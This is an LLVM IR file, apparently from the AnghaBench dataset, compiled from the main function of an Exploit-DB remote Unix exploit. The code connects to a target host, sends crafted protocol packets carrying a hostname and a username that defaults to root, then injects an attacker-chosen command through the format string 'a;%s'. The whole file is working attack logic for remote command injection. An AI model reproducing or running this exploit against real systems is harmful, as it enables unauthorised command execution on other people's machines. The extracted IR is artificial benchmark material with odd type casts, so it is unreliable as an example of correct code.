; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_21215.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_21215.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { %struct.TYPE_2__, i32, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.hostent = type { i32, i32, i32 }
%struct.sockaddr = type { i32 }

@main.buf = internal global [512 x i8] zeroinitializer, align 16
@main.mkdircmd = internal global [4096 x i8] zeroinitializer, align 16
@.str = private unnamed_addr constant [53 x i8] c"usage : %s TargetHost command {hostname} {username}\0A\00", align 1
@.str.1 = private unnamed_addr constant [10 x i8] c"localhost\00", align 1
@.str.2 = private unnamed_addr constant [5 x i8] c"root\00", align 1
@PF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@AF_INET = common dso_local global i32 0, align 4
@TARGET_PORT = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [33 x i8] c"Can not resolve specified host.\0A\00", align 1
@.str.4 = private unnamed_addr constant [26 x i8] c"Can not connect to %s:%d\0A\00", align 1
@.str.5 = private unnamed_addr constant [5 x i8] c"a;%s\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca %struct.hostent*, align 8
  %10 = alloca [4096 x i8], align 16
  %11 = alloca [4096 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %12 = load i32, i32* %4, align 4
  %13 = icmp slt i32 %12, 3
  br i1 %13, label %14, label %20

14:                                               ; preds = %2
  %15 = load i8**, i8*** %5, align 8
  %16 = getelementptr inbounds i8*, i8** %15, i64 0
  %17 = load i8*, i8** %16, align 8
  %18 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str, i64 0, i64 0), i8* %17)
  %19 = call i32 @exit(i32 1) #3
  unreachable

20:                                               ; preds = %2
  %21 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %22 = call i32 @strcpy(i8* %21, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.1, i64 0, i64 0))
  %23 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i64 0, i64 0
  %24 = call i32 @strcpy(i8* %23, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.2, i64 0, i64 0))
  %25 = load i32, i32* %4, align 4
  %26 = icmp sge i32 %25, 5
  br i1 %26, label %27, label %33

27:                                               ; preds = %20
  %28 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i64 0, i64 0
  %29 = load i8**, i8*** %5, align 8
  %30 = getelementptr inbounds i8*, i8** %29, i64 4
  %31 = load i8*, i8** %30, align 8
  %32 = call i32 @strcpy(i8* %28, i8* %31)
  br label %33

33:                                               ; preds = %27, %20
  %34 = load i32, i32* %4, align 4
  %35 = icmp sge i32 %34, 4
  br i1 %35, label %36, label %42

36:                                               ; preds = %33
  %37 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %38 = load i8**, i8*** %5, align 8
  %39 = getelementptr inbounds i8*, i8** %38, i64 3
  %40 = load i8*, i8** %39, align 8
  %41 = call i32 @strcpy(i8* %37, i8* %40)
  br label %42

42:                                               ; preds = %36, %33
  %43 = load i32, i32* @PF_INET, align 4
  %44 = load i32, i32* @SOCK_STREAM, align 4
  %45 = call i32 @socket(i32 %43, i32 %44, i32 0)
  store i32 %45, i32* %6, align 4
  %46 = load i32, i32* @AF_INET, align 4
  %47 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i32 %46, i32* %47, align 4
  %48 = load i32, i32* @TARGET_PORT, align 4
  %49 = call i32 @htons(i32 %48)
  %50 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  store i32 %49, i32* %50, align 4
  %51 = load i8**, i8*** %5, align 8
  %52 = getelementptr inbounds i8*, i8** %51, i64 1
  %53 = load i8*, i8** %52, align 8
  %54 = call i32 @inet_addr(i8* %53)
  %55 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  %56 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %55, i32 0, i32 0
  store i32 %54, i32* %56, align 4
  %57 = icmp eq i32 %54, -1
  br i1 %57, label %58, label %82

58:                                               ; preds = %42
  %59 = load i8**, i8*** %5, align 8
  %60 = getelementptr inbounds i8*, i8** %59, i64 1
  %61 = load i8*, i8** %60, align 8
  %62 = call %struct.hostent* @gethostbyname(i8* %61)
  store %struct.hostent* %62, %struct.hostent** %9, align 8
  %63 = icmp eq %struct.hostent* %62, null
  br i1 %63, label %64, label %67

64:                                               ; preds = %58
  %65 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.3, i64 0, i64 0))
  %66 = call i32 @exit(i32 1) #3
  unreachable

67:                                               ; preds = %58
  %68 = load %struct.hostent*, %struct.hostent** %9, align 8
  %69 = getelementptr inbounds %struct.hostent, %struct.hostent* %68, i32 0, i32 2
  %70 = load i32, i32* %69, align 4
  %71 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i32 %70, i32* %71, align 4
  %72 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  %73 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %72, i32 0, i32 0
  %74 = ptrtoint i32* %73 to i32
  %75 = load %struct.hostent*, %struct.hostent** %9, align 8
  %76 = getelementptr inbounds %struct.hostent, %struct.hostent* %75, i32 0, i32 1
  %77 = load i32, i32* %76, align 4
  %78 = load %struct.hostent*, %struct.hostent** %9, align 8
  %79 = getelementptr inbounds %struct.hostent, %struct.hostent* %78, i32 0, i32 0
  %80 = load i32, i32* %79, align 4
  %81 = call i32 @memcpy(i32 %74, i32 %77, i32 %80)
  br label %82

82:                                               ; preds = %67, %42
  %83 = load i32, i32* %6, align 4
  %84 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %85 = call i64 @connect(i32 %83, %struct.sockaddr* %84, i32 12)
  %86 = icmp ne i64 %85, 0
  br i1 %86, label %87, label %94

87:                                               ; preds = %82
  %88 = load i8**, i8*** %5, align 8
  %89 = getelementptr inbounds i8*, i8** %88, i64 1
  %90 = load i8*, i8** %89, align 8
  %91 = load i32, i32* @TARGET_PORT, align 4
  %92 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.4, i64 0, i64 0), i8* %90, i32 %91)
  %93 = call i32 @exit(i32 1) #3
  unreachable

94:                                               ; preds = %82
  store i8 1, i8* getelementptr inbounds ([512 x i8], [512 x i8]* @main.buf, i64 0, i64 3), align 1
  store i8 79, i8* getelementptr inbounds ([512 x i8], [512 x i8]* @main.buf, i64 0, i64 6), align 2
  %95 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %96 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %97 = call i32 @strlen(i8* %96)
  %98 = call i32 @strncpy(i8* getelementptr inbounds ([512 x i8], [512 x i8]* @main.buf, i64 0, i64 8), i8* %95, i32 %97)
  %99 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %100 = call i32 @strlen(i8* %99)
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds i8, i8* getelementptr inbounds ([512 x i8], [512 x i8]* @main.buf, i64 0, i64 9), i64 %101
  %103 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i64 0, i64 0
  %104 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i64 0, i64 0
  %105 = call i32 @strlen(i8* %104)
  %106 = call i32 @strncpy(i8* %102, i8* %103, i32 %105)
  %107 = load i32, i32* %6, align 4
  %108 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %109 = call i32 @strlen(i8* %108)
  %110 = add nsw i32 10, %109
  %111 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i64 0, i64 0
  %112 = call i32 @strlen(i8* %111)
  %113 = add nsw i32 %110, %112
  %114 = call i32 @send(i32 %107, i8* getelementptr inbounds ([512 x i8], [512 x i8]* @main.buf, i64 0, i64 0), i32 %113, i32 0)
  %115 = load i32, i32* %6, align 4
  %116 = call i32 @dump_recv(i32 %115)
  %117 = call i32 @memset(i8* getelementptr inbounds ([512 x i8], [512 x i8]* @main.buf, i64 0, i64 0), i32 0, i32 512)
  store i8 7, i8* getelementptr inbounds ([512 x i8], [512 x i8]* @main.buf, i64 0, i64 3), align 1
  %118 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i64 0, i64 0
  %119 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i64 0, i64 0
  %120 = call i32 @strlen(i8* %119)
  %121 = call i32 @strncpy(i8* getelementptr inbounds ([512 x i8], [512 x i8]* @main.buf, i64 0, i64 4), i8* %118, i32 %120)
  %122 = load i32, i32* %6, align 4
  %123 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i64 0, i64 0
  %124 = call i32 @strlen(i8* %123)
  %125 = add nsw i32 5, %124
  %126 = call i32 @send(i32 %122, i8* getelementptr inbounds ([512 x i8], [512 x i8]* @main.buf, i64 0, i64 0), i32 %125, i32 0)
  %127 = load i32, i32* %6, align 4
  %128 = call i32 @dump_recv(i32 %127)
  %129 = call i32 @memset(i8* getelementptr inbounds ([512 x i8], [512 x i8]* @main.buf, i64 0, i64 0), i32 0, i32 512)
  store i8 5, i8* getelementptr inbounds ([512 x i8], [512 x i8]* @main.buf, i64 0, i64 3), align 1
  %130 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i64 0, i64 0
  %131 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i64 0, i64 0
  %132 = call i32 @strlen(i8* %131)
  %133 = call i32 @strncpy(i8* getelementptr inbounds ([512 x i8], [512 x i8]* @main.buf, i64 0, i64 4), i8* %130, i32 %132)
  %134 = load i32, i32* %6, align 4
  %135 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i64 0, i64 0
  %136 = call i32 @strlen(i8* %135)
  %137 = add nsw i32 5, %136
  %138 = call i32 @send(i32 %134, i8* getelementptr inbounds ([512 x i8], [512 x i8]* @main.buf, i64 0, i64 0), i32 %137, i32 0)
  %139 = load i32, i32* %6, align 4
  %140 = call i32 @dump_recv(i32 %139)
  %141 = load i8**, i8*** %5, align 8
  %142 = getelementptr inbounds i8*, i8** %141, i64 2
  %143 = load i8*, i8** %142, align 8
  %144 = call i32 @sprintf(i8* getelementptr inbounds ([4096 x i8], [4096 x i8]* @main.mkdircmd, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.5, i64 0, i64 0), i8* %143)
  %145 = call i32 @memset(i8* getelementptr inbounds ([512 x i8], [512 x i8]* @main.buf, i64 0, i64 0), i32 0, i32 512)
  store i8 81, i8* getelementptr inbounds ([512 x i8], [512 x i8]* @main.buf, i64 0, i64 3), align 1
  %146 = call i32 @strlen(i8* getelementptr inbounds ([4096 x i8], [4096 x i8]* @main.mkdircmd, i64 0, i64 0))
  %147 = call i32 @strncpy(i8* getelementptr inbounds ([512 x i8], [512 x i8]* @main.buf, i64 0, i64 8), i8* getelementptr inbounds ([4096 x i8], [4096 x i8]* @main.mkdircmd, i64 0, i64 0), i32 %146)
  %148 = load i32, i32* %6, align 4
  %149 = call i32 @strlen(i8* getelementptr inbounds ([4096 x i8], [4096 x i8]* @main.mkdircmd, i64 0, i64 0))
  %150 = add nsw i32 8, %149
  %151 = add nsw i32 %150, 1
  %152 = call i32 @send(i32 %148, i8* getelementptr inbounds ([512 x i8], [512 x i8]* @main.buf, i64 0, i64 0), i32 %151, i32 0)
  %153 = load i32, i32* %6, align 4
  %154 = call i32 @dump_recv(i32 %153)
  %155 = load i32, i32* %6, align 4
  %156 = call i32 @close(i32 %155)
  %157 = load i32, i32* %3, align 4
  ret i32 %157
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @strcpy(i8*, i8*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @memcpy(i32, i32, i32) #1

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @strncpy(i8*, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @dump_recv(i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @sprintf(i8*, i8*, i8*) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
